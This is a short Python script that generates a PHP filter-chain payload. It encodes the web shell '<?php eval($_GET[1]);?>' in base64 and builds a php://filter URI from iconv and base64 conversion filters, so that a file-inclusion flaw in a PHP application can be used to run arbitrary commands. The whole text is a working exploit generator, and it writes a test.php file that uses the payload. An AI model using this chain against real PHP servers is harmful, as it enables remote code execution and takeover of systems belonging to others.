file_to_use = "./init"

#<?php eval($_GET[1]);?>a
base64_payload = "PD9waHAgZXZhbCgkX0dFVFsxXSk7Pz5h"

# generate some garbage base64
filters = "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.base64-encode|"
# make sure to get rid of any equal signs in both the string we just generated and the rest of the file
filters += "convert.iconv.UTF8.UTF7|"


for c in base64_payload[::-1]:
        filters += open('./res/'+c).read() + "|"
        # decode and reencode to get rid of everything that isn't valid base64
        filters += "convert.base64-decode|"
        filters += "convert.base64-encode|"
        # get rid of equal signs
        filters += "convert.iconv.UTF8.UTF7|"

filters += "convert.base64-decode"

final_payload = f"php://filter/{filters}/resource={file_to_use}"

with open('test.php','w') as f:
    f.write('<?php echo file_get_contents("'+final_payload+'");?>')
print(final_payload)